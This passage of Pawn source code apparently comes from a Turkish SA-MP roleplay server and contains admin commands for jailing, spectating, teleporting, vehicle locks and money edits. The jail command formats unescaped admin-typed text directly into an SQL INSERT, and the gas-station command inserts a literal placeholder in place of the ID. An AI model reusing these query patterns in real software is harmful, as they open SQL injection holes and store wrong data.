   				SetPlayerPos(playerid, x, y, z),
				MotoruKapat(vid);
				Arac[vid][ainterior] = GetPlayerInterior(playerid);
				Arac[vid][avworld] = GetPlayerVirtualWorld(playerid);
				format(string, sizeof(string), "~w~ARAC ~g~PARK EDILDI");
				GameTextForPlayer(playerid, string, 2500, 4);
				RemovePlayerFromVehicle(playerid);
				AracKaydet(vid);
			}
	    }
	    return 1;
 	}
	if(strcmp(string, "/aakilit", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] < 1 || !Girdi[playerid] || !AKontrol(playerid))
	    {
			return Hata(playerid, "Hatalý bir komut girdiniz.");
		}
     	new vid = AracMesafesi(3.0, playerid);
      	if(vid != 0)
       	{
			if(Arac[vid][akilit])
			{
				format(string, sizeof(string), "~g~KILIT ACILDI");
    			GameTextForPlayer(playerid, string, 2000, 4);
				KilitAc(vid);
			}
			else
			{
				format(string, sizeof(string), "~r~KILITLENDI");
				GameTextForPlayer(playerid, string, 2000, 4);
    			KilitKapat(vid);
			}
        }
        else Hata(playerid, "Yakýnýnýzda araç bulunmamaktadýr.");
	    return 1;
	}
 	if(strcmp(string, "/izle", true) == 0 || strcmp(string, "/specplayer", true) == 0)
	 {
		if (Karakter[playerid][adminlevel] < 1)
		{
			Hata(playerid, "Yönetici deðilsiniz.");
			return 1;
		}
		string = adminspec_strtok(cmdtext, idx);
		if(!strlen(string))
		{
			if(gSpectateType[playerid] != ADMIN_SPEC_TYPE_NONE)
			{
				TogglePlayerSpectating(playerid, 0);
				gSpectateID[playerid] = INVALID_PLAYER_ID;
				gSpectateType[playerid] = ADMIN_SPEC_TYPE_NONE;
		  		Bilgi(playerid, "Ýzleme kapatýldý.");
		  		SetPlayerSkin(playerid, Karakter[playerid][skin]);
				SetPlayerPos(playerid, GetPVarInt(playerid, "IzleVarX"), GetPVarInt(playerid, "IzleVarY"), GetPVarInt(playerid, "IzleVarZ"));
				SetPlayerInteriorEx(playerid, GetPVarInt(playerid, "IzleVarInt"));
				SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "IzleVarVw"));
				SetPVarInt(playerid, "IzleID", -1);
				if(Karakter[playerid][isbasi] == 1 && Birlik[Karakter[playerid][birlik]][ftip] == LSPD)
				{
					SetPlayerSkin(playerid, Karakter[playerid][isbasiskin]);
					SetPlayerColor(playerid,0x8D8DFFFF);
		   			GivePlayerWeapon(playerid, 3, 1);
		        	GivePlayerWeapon(playerid, 41, 1000);
		        	GivePlayerWeapon(playerid, 24, 50);
				}
				return 1;
			}
			else Kullanim(playerid, "/izle [playerid]");
			return 1;
		}
		specplayerid = strval(string);
		if(!IsPlayerConnected(specplayerid))
		{
		    SendClientMessage(playerid, COLOR_RED, "Böyle bir oyuncu yok.");
			return 1;
		}
		if(gSpectateType[playerid] == ADMIN_SPEC_TYPE_NONE)
		{
		    if(gSpectateType[specplayerid] != ADMIN_SPEC_TYPE_NONE) return Hata(playerid, "Bu yönetici þuan oyuncu izlemektedir.");
			new Float:naberatakanx, Float:naberatakany, Float:naberatakanz;
			GetPlayerPos(playerid, naberatakanx, naberatakany, naberatakanz);
	  		SetPVarInt(playerid, "IzleVarX", floatround(naberatakanx));
	    	SetPVarInt(playerid, "IzleVarY", floatround(naberatakany));
	     	SetPVarInt(playerid, "IzleVarZ", floatround(naberatakanz));
	     	SetPVarInt(playerid, "IzleVarInt", GetPlayerInterior(playerid));
	     	SetPVarInt(playerid, "IzleVarVw", GetPlayerVirtualWorld(playerid));
		}
     	if(Karakter[playerid][adminlevel] < Karakter[specplayerid][adminlevel])
     	{
     	    new am[128];
     	    format(am, sizeof(am), "ÇAKTIRMA: %s, seni izlemeye baþladý.", OyuncuAdiniBul(playerid));
     	    Bilgi(specplayerid, am);
     	}
		SetPVarInt(playerid, "IzleID", specplayerid);
		if(IsPlayerInAnyVehicle(specplayerid))
		{
			new specvehicleid = GetPlayerVehicleID(specplayerid);
			TogglePlayerSpectating(playerid, 1);
			PlayerSpectateVehicle(playerid, specvehicleid);
			gSpectateID[playerid] = specplayerid;
			gSpectateType[playerid] = ADMIN_SPEC_TYPE_VEHICLE;
		}
		else
		{
	    	SetPlayerInteriorEx(playerid,GetPlayerInterior(specplayerid));
			SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(specplayerid));
			TogglePlayerSpectating(playerid, 1);
			PlayerSpectatePlayer(playerid, specplayerid);
			gSpectateID[playerid] = specplayerid;
			gSpectateType[playerid] = ADMIN_SPEC_TYPE_PLAYER;
			BilgileriGoster(playerid,specplayerid);
		}
 		return 1;
	}
	if(strcmp(string, "/sessizjail", true) == 0 || Buysa("/sjail",string))
	{
	    if(IsPlayerConnected(playerid))
	    {
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/sjail [oyuncuID/isim] [zaman(dakika olarak)] [sebep]");
				return 1;
			}
			new playa;
			new money;
			playa = ReturnUser(string);
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/sjail [oyuncuID/isim] [zaman(dakika olarak)] [sebep]");
				return 1;
			}
			money = strval(string);
			if (Karakter[playerid][adminlevel] >= 3 && Karakter[playerid][aGirdi] == 1)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
						new lengthahapis = strlen(cmdtext);
						while ((idx < lengthahapis) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offsetahapis = idx;
						new resultahapis[128];
						while ((idx < lengthahapis) && ((idx - offsetahapis) < (sizeof(resultahapis) - 1)))
						{
							resultahapis[idx - offsetahapis] = cmdtext[idx];
							idx++;
						}
						resultahapis[idx - offsetahapis] = EOS;
						if(!strlen(resultahapis))
						{
							Kullanim(playerid, "/sjail [oyuncuID/isim] [zaman(dakika olarak)] [sebep]");
							return 1;
						}
						if(Karakter[playerid][adminlevel] < Karakter[playa][adminlevel])
				     	{
				     	    Ipucu(playerid, "Kendinizden yüksek levelli admine iþlem yapamazsýnýz.");
				     	    return 0;
				     	}
						new logtut[128];
						if(money == 0)
						{
							format(string, sizeof(string), "* %s adlý kiþiyi hapisten çýkardýnýz.", OyuncuAdiniBul(playa));
							SendClientMessage(playerid, COLOR_LIGHTRED, string);
							format(logtut, sizeof(logtut), "[AHAPIS] %s adli yonetici tarafindan hapisten cikartildi.",OyuncuAdiniBul(playerid));
							Log(playa,logtut);
							format(logtut, sizeof(logtut), "[AHAPIS] %s isimli kisiyi hapisten cikartti.",OyuncuAdiniBul(playa));
							Log(playerid, logtut);

						    SetPlayerPos(playa, 1549.7474,-1675.6018,15.1029);
						    SetPlayerFacingAngle(playa, 88.6741);
						    TogglePlayerControllable(playa, 1);
						    Karakter[playa][ajail] = 0;
						}
						else
						{
							format(string, sizeof(string), "* %s adlý kiþiyi hapsettiniz.", OyuncuAdiniBul(playa));
							SendClientMessage(playerid, COLOR_LIGHTRED, string);
							ResetPlayerWeapons(playa);
							Karakter[playa][ajail] = money;
							SetPlayerVirtualWorld(playa, 2938);
							SetPlayerPos(playa, 1538.5103,-1371.2427,328.2358);
							format(string, sizeof(string), " %d dakikalýðýna hapse girdiniz. ", money);
							SendClientMessage(playa, COLOR_LIGHTBLUE, string);
							TogglePlayerControllable(playa,0);
							format(logtut, sizeof(logtut), "[AHAPIS] %s tarafindan cezalandirildi. Sebep: %s - %d dk", OyuncuAdiniBul(playerid), (resultahapis), money);
							Log(playa, logtut);
							format(logtut, sizeof(logtut), "[AHAPIS] %s isimli kisiyi cezalandirdi. Sebep: %s - %d dk", OyuncuAdiniBul(playa), (resultahapis), money);
							Log(playerid, logtut);
						}
					}
				}
			}
			else
			{
				Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiniz yok.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/ahapis", true) == 0 || strcmp(string, "/ajail", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/ahapis [oyuncuID/isim] [zaman(dakika olarak)] [sebep]");
				return 1;
			}
			new playa;
			new money;
			playa = ReturnUser(string);
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/ahapis [oyuncuID/isim] [zaman(dakika olarak)] [sebep]");
				return 1;
			}
			money = strval(string);
			if (Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
						new lengthahapis = strlen(cmdtext);
						while ((idx < lengthahapis) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offsetahapis = idx;
						new resultahapis[128];
						while ((idx < lengthahapis) && ((idx - offsetahapis) < (sizeof(resultahapis) - 1)))
						{
							resultahapis[idx - offsetahapis] = cmdtext[idx];
							idx++;
						}
						resultahapis[idx - offsetahapis] = EOS;
						if(!strlen(resultahapis))
						{
							Kullanim(playerid, "/ahapis [oyuncuID/isim] [zaman(dakika olarak)] [sebep]");
							return 1;
						}
						if(Karakter[playerid][adminlevel] < Karakter[playa][adminlevel])
				     	{
				     	    Ipucu(playerid, "Kendinizden yüksek levelli admine iþlem yapamazsýnýz.");
				     	    return 0;
				     	}
						new logtut[128];
						if(money == 0)
						{
							format(string, sizeof(string), "* %s adlý kiþiyi hapisten çýkardýnýz.", OyuncuAdiniBul(playa));
							SendClientMessage(playerid, COLOR_LIGHTRED, string);
							format(string, sizeof(string), "* Yönetici %s tarafýndan hapisten çýkarýldýnýz.", OyuncuAdiniBul(playerid));
							SendClientMessage(playa, COLOR_LIGHTRED, string);
							printf("%s adli yonetici %s adli kisiyi hapisten cikardi.",OyuncuAdiniBul(playerid),OyuncuAdiniBul(playa));
							format(logtut, sizeof(logtut), "[AHAPIS] %s adli yonetici tarafindan hapisten cikartildi.",OyuncuAdiniBul(playerid));
							Log(playa,logtut);
							format(logtut, sizeof(logtut), "[AHAPIS] %s isimli kisiyi hapisten cikartti.",OyuncuAdiniBul(playa));
							Log(playerid, logtut);

						    SetPlayerPos(playa, 1549.7474,-1675.6018,15.1029);
						    SetPlayerFacingAngle(playa, 88.6741);
						    SetPlayerInterior(playa, 0);
						    SetPlayerVirtualWorld(playa, 0);
						    TogglePlayerControllable(playa, 1);
						    Karakter[playa][ajail] = 0;
						}
						else
						{
							format(string, sizeof(string), "* %s adlý kiþiyi hapsettiniz.", OyuncuAdiniBul(playa));
							SendClientMessage(playerid, COLOR_LIGHTRED, string);
							format(string, sizeof(string), "* Yönetici %s tarafýndan hapsedildiniz.", OyuncuAdiniBul(playerid));
							SendClientMessage(playa, COLOR_LIGHTRED, string);
							ResetPlayerWeapons(playa);
							Karakter[playa][ajail] = money;
							SetPlayerVirtualWorld(playa, 2938);
							SetPlayerPos(playa, 1538.5103,-1371.2427,328.2358);
							format(string, sizeof(string), " %d dakikalýðýna hapse girdiniz. ", money);
							SendClientMessage(playa, COLOR_LIGHTBLUE, string);
							TogglePlayerControllable(playa,0);
							format(logtut, sizeof(logtut), "[AHAPIS] %s tarafindan cezalandirildi. Sebep: %s - %d dk", OyuncuAdiniBul(playerid,1), (resultahapis), money);
							Log(playa, logtut);
							format(logtut, sizeof(logtut), "[AHAPIS] %s isimli kisiyi cezalandirdi. Sebep: %s - %d dk", OyuncuAdiniBul(playa,1), (resultahapis), money);
							Log(playerid, logtut);
							new mtext[20];
							new year, month,day;
							getdate(year, month, day);
							if(month == 1) { mtext = "Ocak"; }
							else if(month == 2) { mtext = "Subat"; }
							else if(month == 3) { mtext = "Mart"; }
							else if(month == 4) { mtext = "Nisan"; }
							else if(month == 5) { mtext = "Mayis"; }
							else if(month == 6) { mtext = "Haziran"; }
							else if(month == 7) { mtext = "Temmuz"; }
							else if(month == 8) { mtext = "Agustos"; }
							else if(month == 9) { mtext = "Eylul"; }
							else if(month == 10) { mtext = "Ekim"; }
							else if(month == 11) { mtext = "Kasim"; }
							else if(month == 12) { mtext = "Aralik"; }
							new hour,minuite,second;
							gettime(hour,minuite,second);
							new __mstring[512];
							format(__mstring, sizeof(__mstring), "%d %s %d - %d:%d", day,mtext,year,hour,minuite);
							new query[256];
							format(query, sizeof(query), "INSERT INTO `oochapis` (`ad`,`nick`,`sebep`,`sure`,`tarih`,`yonetici`) VALUES ('%s','%s','%s','%d','%s','%s')",
							OyuncuAdiniBul(playa),
							Karakter[playa][nick],
							(resultahapis),
							money,
							__mstring,
							Karakter[playerid][anick]);
							mysql_tquery(1,query);
							format(string, sizeof(string), "(( %s cezalandýrýldý. Süre: %d Sebep: %s %d/%s%d/%s%d - %s%d:%s%d ))", OyuncuAdiniBul(playa,1),money,(resultahapis), day, ((month < 10) ? ("0") : ("")), month, (year < 10) ? ("0") : (""), year, (hour < 10) ? ("0") : (""), hour, (minuite < 10) ? ("0") : (""), minuite);
							SendClientMessageToAll(COLOR_RED, string);
						}
					}
				}
			}
			else
			{
				Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiniz yok.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/check", true) == 0 || strcmp(string, "/kontrol", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid, "/check [oyuncuID]");
	            return 1;
	        }
	        if(!IsPlayerConnected(strval(string)))
	        {
	            Hata(playerid, "Böyle bir oyuncu yok.");
	            return 1;
			}
	        BilgileriGoster(playerid, strval(string));
		}
		return 1;
	}
	if(strcmp(string, "/igit", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid, "/igit [iþyeri id]");
	            return 1;
			}
			new id = strval(string);
			if(IsValidDynamicPickup(Isyeri[id][ipickupid]))
			{
			    SetPlayerPos(playerid, Isyeri[id][girisX], Isyeri[id][girisY], Isyeri[id][girisZ]);
			    SetPlayerInteriorEx(playerid, Isyeri[id][igirisint]);
			    SetPlayerVirtualWorld(playerid, Isyeri[id][igirisvw]);
			}
			else Hata(playerid, "Bu idli iþyeri bulunmamaktadýr.");
		}
		return 1;
	}
	if(strcmp(string, "/egit", true) == 0 || strcmp(string, "/evgit", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid, "/e(v)git [evID]");
	            return 1;
			}
			new id = strval(string);
			if(Ev[id][girisX] != 0 && Ev[id][girisY] != 0 && Ev[id][girisZ] != 0)
			{
			    SetPlayerPos(playerid, Ev[id][girisX], Ev[id][girisY], Ev[id][girisZ]);
			    SetPlayerInteriorEx(playerid, Ev[id][egirisint]);
			    SetPlayerVirtualWorld(playerid, Ev[id][egirisvw]);
			}
			else Hata(playerid, "Bu idli ev bulunmamaktadýr.");
		}
		return 1;
	}
	if(strcmp(string, "/aekilit", true) == 0 || strcmp(string, "/aevkilit", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        new mesafe = EvMesafesi(2.0, playerid);
	        if(mesafe == 0){Hata(playerid, "Yakýnýnýzda hiç ev yok."); return 1; }
	        if(Karakter[playerid][adminlevel] < 1){Hata(playerid,"Bu komutu kullanabilmek için yönetici olmalýsýnýz."); return 1; }
			if(Ev[mesafe][ekilit] == 0)
			{
				OnPlayerCommandPerformed(playerid,"/me anahtarlarýný çýkarýr ve evini kilitler.",0);
				Ev[mesafe][ekilit] = 1;
			}
			else
			{
				OnPlayerCommandPerformed(playerid,"/me anahtarlarýný çýkarýr ve evinin kilidini açar.",0);
				Ev[mesafe][ekilit] = 0;
			}
		}
		return 1;
	}
	if(strcmp(string, "/hhelp", true) == 0)
	{
	    if(Karakter[playerid][tester] == 0)
	        return 1;
     	if(Karakter[playerid][tester] >= 1)
			SendClientMessage(playerid, -1, ""C3"[1] "C1"/sorular");
        if(Karakter[playerid][tester] >= 2)
        	SendClientMessage(playerid, -1, ""C3"[2] "C1"/gonderls, /gonderganton, /setint, /setvw");
		return 1;
	}
	if(strcmp(string, "/ahelp", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] == 0)
	        return 1;
		if(Karakter[playerid][adminlevel] >= 1)
			SendClientMessage(playerid, -1, "[1] /awork, /ac, /tc, /anick, /izle, /kick, /ahapis, /slap, /freeze, /uf, /check, /afly, /gotoadm, /gotols, /gotolv, /gotosf");
        if(Karakter[playerid][adminlevel] >= 1)
			SendClientMessage(playerid, -1, "[1] /tps, /lgoto, /gonderls, /gonderganton, /gonder, /goto, /gethere, /gotocar, /gotocarin, /getcar, /igit, /egit");
        if(Karakter[playerid][adminlevel] >= 1)
			SendClientMessage(playerid, -1, "[1] /aakilit, /aekilit, /aikilit, /setskin, /sethp, /setarmour, /aiyilestir, /autedavi, /setvw, /setint, /amac, /apark");
        if(Karakter[playerid][adminlevel] >= 1)
			SendClientMessage(playerid, -1, "[1] /rtc, /atamir, /abenzindoldur, /avergisifirla, /arenk, /acevir, /mikrofonver, /reklamlar, /usil, /asure, /muzikdurdur");
        if(Karakter[playerid][adminlevel] >= 1)
			SendClientMessage(playerid, -1, "[1] /aehliyet, /birlikcikar /birlikid, /birlikler, /gruplar, /silahbak, /silahyer, /tezgahbilgi, /maskeliler");
        if(Karakter[playerid][adminlevel] >= 1)
			SendClientMessage(playerid, -1, "[1] /radyoacanlar, /gpsler, /agpskaldir, /akamerakaldir, /mspawn, /mark, /aracid, /banliaraclar, /banlievler, /banliisyerleri");
        if(Karakter[playerid][adminlevel] >= 2)
			SendClientMessage(playerid, -1, "[2] /ban, /oban, /ojail, /auyari, /aip, /adminreklam, /afact, /amermiver");
        if(Karakter[playerid][adminlevel] >= 3)
			SendClientMessage(playerid, -1, "[3] /sjail, /sban, /skick, /hava, /saat, /intliste, /intgit, /aractipleri, /isyeritipleri");
        if(Karakter[playerid][adminlevel] >= 3)
			SendClientMessage(playerid, -1, "[3] /silahsil, /amuhurle, /aisimsil, /aisimgoster");
        if(Karakter[playerid][adminlevel] >= 4)
			SendClientMessage(playerid, -1, "[4] /unban, /auyariduzenle, /rac, /sethpall, /hpallcars, /allbenzindoldur, /makeleader, /birlikduzenle, /akitver");
        if(Karakter[playerid][adminlevel] >= 4)
			SendClientMessage(playerid, -1, "[4] /afacttip, /sesler, /havadurum, /agraffiti, /amaske, /anpc, /atmekle, /atmduzenle, /atmid, /atmsil, /a2xpayday");
		if(Karakter[playerid][adminlevel] >= 4)
			SendClientMessage(playerid, -1, "[4] /uduzenle, /ickifiyat, /benzinfiyat, /yiyecekfiyat, /kaydet, /pickupgetir, /birlikisim, /nickduzenle, /kduzenle");
        if(Karakter[playerid][adminlevel] >= 5)
			SendClientMessage(playerid, -1, "[5] /aduyuru, /aduzenle, /admpmac, /admpmkapat, /birlikyarat, /evekle, /eduzenle, /iekle, /iduzenle, /intekle, /icatiduzenle");
        if(Karakter[playerid][adminlevel] >= 5)
			SendClientMessage(playerid, -1, "[5] /intduzelt, /bistasyonolustur, /bistasyonduzenle, /kickall, /asilahruhsat, /aruhsatsilah, /birlikitibar, /birlikseviye, /birlikonay");
		if(Karakter[playerid][adminlevel] >= 5)
			SendClientMessage(playerid, -1, "[5] /birliktip, /agaraj, /igarajduzenle, /ecatiduzenle, /antelefon, /acctv, /aactor, /unluyap, /aplaka, /aplakatext, /avukatyap");
        if(Karakter[playerid][adminlevel] >= 5)
			SendClientMessage(playerid, -1, "[5] /ayilbasi, /asecim, /silahguncelle, /ajetpack, /galerilisans, /afbi, /arozetno, /birlikdestek, /suresifirla, /basvurudurum");
        if(Karakter[playerid][adminlevel] >= 6)
			SendClientMessage(playerid, -1, "[6] /cc, /achat, /veriduzenle, /evsil, /isil, /aekle, /aekle2(SÝREN), /aracsil, /izleyenler, /aparaver, /oparaver, /aparaduzenle");
		if(Karakter[playerid][adminlevel] >= 6)
			SendClientMessage(playerid, -1, "[6] /givegun2, /hediyever, /aantiafk, /apiyango, /apiyangobitir, /makeadmin, /makehelper, /verikaydi, /aobje, /agate");
		if(Karakter[playerid][adminlevel] >= 6)
			SendClientMessage(playerid, -1, "[6] /abankaduzenle, /givegun, /abirlikbankaduzenle, /abirlikbanka");
		return 1;
	}
	if(strcmp(string, "/aikilit", true) == 0 || strcmp(string, "/aiskilit", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        new mesafe = IsyeriMesafesi(2.0, playerid);
	        if(mesafe == 0){Hata(playerid, "Yakýnýnýzda hiç iþyeri yok."); return 1; }
	        if(Karakter[playerid][adminlevel] < 1){Hata(playerid,"Bu komutu kullanabilmek için yönetici olmalýsýnýz."); return 1; }
			if(Isyeri[mesafe][ikilit] == 0)
			{
				OnPlayerCommandPerformed(playerid,"/me anahtarlarýný çýkarýr ve iþyerini kilitler.",0);
				Isyeri[mesafe][ikilit] = 1;
			}
			else
			{
				OnPlayerCommandPerformed(playerid,"/me anahtarlarýný çýkarýr ve iþyerinin kilidini açar.",0);
				Isyeri[mesafe][ikilit] = 0;
			}
		}
		return 1;
	}
	if(strcmp(string, "/bistasyonolustur", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
		{
	        new istasyonid, Float:xxx, Float:yyy, Float:zzz;
	        istasyonid = SonrakistasyonID();
	        GetPlayerPos(playerid, xxx, yyy, zzz);
	        Benzinistasyonu[istasyonid][bID] = istasyonid;
	        Benzinistasyonu[istasyonid][bPosX] = xxx;
	        Benzinistasyonu[istasyonid][bPosY] = yyy;
	        Benzinistasyonu[istasyonid][bPosZ] = zzz;
	        Benzinistasyonu[istasyonid][bDurum] = 1;
	        format(string, sizeof(string), "INSERT INTO  `benzinistasyonlari` (`id`,`posx`,`posy`,`posz`,`durum`) VALUES ('istasyonid', '%f', '%f', '%f', '0');", xxx, yyy, zzz);
         	mysql_tquery(1,string);
			Bilgi(playerid, "Benzin istasyonu baþarýyla oluþturuldu.");
		}
		else
		{
			Hata(playerid, "Bu komutu kullanabilmek için yetkiye sahip deðilsiniz.");
			return 1;
		}
 		return 1;
 	}
	if(strcmp(string, "/bistasyonduzenle", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
		{
	        new istasyonid = GetClosestistasyonID(playerid);
	        if(Benzinistasyonu[istasyonid][bDurum] == 1)
	        {
	            Bilgi(playerid, "Ýstasyon kullanýma kapatýldý.(kalýcý deðil)");
	            Benzinistasyonu[istasyonid][bDurum] = 0;
			}
			else
			{
			    Bilgi(playerid, "Ýstasyon kullanýma açýldý.(kalýcý deðil)");
			    Benzinistasyonu[istasyonid][bDurum] = 1;
			}
		}
		else
		{
  			Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiye sahip deðilsiniz.");
	    }
		return 1;
	}
	if(strcmp(string, "/verikaydi", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
	    {
	        Bilgi(playerid, "Veriler kayýt edildi.");
	        VerileriKaydet();
		}
		else
		{
		    Hata(playerid, "Bu komutu kullanabilmek için yönetici olmalýsýnýz.");
		}
		return 1;
	}
	if(strcmp(string, "/sethp", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string)) return Kullanim(playerid, "/sethp [ID/isim] [can miktarý]");
			new adaminadi = ReturnUser(string);
			if(IsPlayerConnected(ReturnUser(string)))
			{
				string = strtok(cmdtext, idx);
				if(!strlen(string)) return Kullanim(playerid, "/sethp [ID/isim] [can miktarý]");
				new hpmiktari = strval(string);
				format(string, sizeof(string), "%s isimli oyuncunun canýný %d olarak ayarladýnýz.", OyuncuAdiniBul(adaminadi), hpmiktari);
				Bilgi(playerid, string);
				SetPlayerHealth(adaminadi, hpmiktari);
			}
			else Hata(playerid, "Hatalý bir ID girdiniz.");
		}
		return 1;
	}
	if(strcmp(string, "/setarmour", true) == 0 || strcmp(string, "/setarmor", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string)) return Kullanim(playerid, "/setarmour [ID/isim] [armour miktarý]");
			new adaminadi = ReturnUser(string);
			if(IsPlayerConnected(ReturnUser(string)))
			{
				string = strtok(cmdtext, idx);
				if(!strlen(string)) return Kullanim(playerid, "/setarmour [ID/isim] [armour miktarý]");
				new hpmiktari = strval(string);
				format(string, sizeof(string), "%s isimli oyuncunun armourunu %d olarak ayarladýnýz.", OyuncuAdiniBul(adaminadi), hpmiktari);
				Bilgi(playerid, string);
				SetPlayerArmour(adaminadi, hpmiktari);
			}
			else Hata(playerid, "Hatalý bir ID girdiniz.");
		}
		return 1;
	}
	if(strcmp(string, "/fixveh", true) == 0 || strcmp(string, "/atamir", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        if(IsPlayerInAnyVehicle(playerid))
	        {
	            Aractamiri(GetPlayerVehicleID(playerid));
	            SetPVarInt(playerid, "VehicleRepair", 1);
	            if(Arac[GetPlayerVehicleID(playerid)][parcalandi]) Arac[GetPlayerVehicleID(playerid)][parcalandi] = 0;
	            Bilgi(playerid, "Aracýnýz tamir edildi.");
			}
			else
			{
			    new pid;
			   	string = strtok(cmdtext, idx);
			    if(sscanf(string,"d",pid)) return Kullanim(playerid, "/atamir [aracID]");
			    if(!IsValidVehicle(pid)) return Hata(playerid, "Yanlýþ id girdiniz.");
			    Aractamiri(pid);
			    SetPVarInt(playerid, "VehicleRepair", 1);
			    Bilgi(playerid, "Aracý tamir ettiniz.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/flipveh", true) == 0 || strcmp(string, "/acevir", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        if(IsPlayerInAnyVehicle(playerid))
	        {
	            FlipVehicle(GetPlayerVehicleID(playerid));
	            Bilgi(playerid, "Aracýnýz çevrildi.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/aparaver", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
	    {
			string = strtok(cmdtext, idx);
	        if(!strlen(string)) return Kullanim(playerid, "/aparaver [ID/isim] [para]");
			new adaminadi = ReturnUser(string);
			if(IsPlayerConnected(ReturnUser(string)))
			{
			    string = strtok(cmdtext, idx);
	        	if(!strlen(string)) return Kullanim(playerid, "/aparaver [ID/isim] [para]");
				new paramiktari = strval(string);
				format(string, sizeof(string), "%s isimli oyuncuya %d$ verdiniz.",OyuncuAdiniBul(adaminadi),paramiktari);
				Bilgi(playerid, string);
				format(string, sizeof(string), "[APARAVER] %s isimli oyuncunun parasina %d$ ekledi.", OyuncuAdiniBul(adaminadi), paramiktari);
				Log(playerid, string);
				format(string, sizeof(string), "%s adlý yönetici size %d$ verdi.",OyuncuAdiniBul(playerid),paramiktari);
				Bilgi(adaminadi, string);
				format(string, sizeof(string), "[APARAVER - PARAALDI] %s isimli yonetici parasina %d$ ekledi.", OyuncuAdiniBul(playerid), paramiktari);
				Log(adaminadi, string);
				GivePlayerCash(adaminadi, paramiktari);
				return 1;
			}
			else Hata(playerid, "Hatalý bir ID girdiniz.");
		}
		else Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiye sahip deðilsiniz.");
		return 1;
	}
	if(strcmp(string, "/aparaduzenle", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
	    {
			string = strtok(cmdtext, idx);
	        if(!strlen(string)) return Kullanim(playerid, "/aparaduzenle [ID/isim] [para]");
			new adaminadi = ReturnUser(string);
			if(IsPlayerConnected(ReturnUser(string)))
			{
			    string = strtok(cmdtext, idx);
	        	if(!strlen(string)) return Kullanim(playerid, "/aparaduzenle [ID/isim] [para]");
				new paramiktari = strval(string);
				format(string, sizeof(string), "%s isimli oyuncunun parasýný %d$ olarak deðiþtirdiniz.",OyuncuAdiniBul(adaminadi),paramiktari);
				Bilgi(playerid, string);
				format(string, sizeof(string), "[APARADUZENLE] %s isimli oyuncunun parasini %d$ olarak degistirdi.", OyuncuAdiniBul(adaminadi), paramiktari);
				Log(playerid, string);
				format(string, sizeof(string), "%s adlý yönetici paranýzý %d$ olarak düzenledi.",OyuncuAdiniBul(playerid),paramiktari);
				Bilgi(adaminadi, string);
				format(string, sizeof(string), "[APARADUZENLE - PARAALDI] %s isimli yonetici parasini %d$ olarak degistirdi.", OyuncuAdiniBul(playerid), paramiktari);
				Log(adaminadi, string);
				SetPlayerCash(adaminadi, paramiktari);
				return 1;
			}
			else Hata(playerid, "Hatalý bir ID girdiniz.");
		}
		else Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiye sahip deðilsiniz.");
		return 1;
	}
	if(strcmp(string, "/abankaduzenle", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
	    {
			string = strtok(cmdtext, idx);
	        if(!strlen(string)) return Kullanim(playerid, "/abankaduzenle [ID/isim] [para]");
			new adaminadi = ReturnUser(string);
			if(IsPlayerConnected(ReturnUser(string)))
			{
			    string = strtok(cmdtext, idx);
	        	if(!strlen(string)) return Kullanim(playerid, "/abankaduzenle [ID/isim] [para]");
				new paramiktari = strval(string);
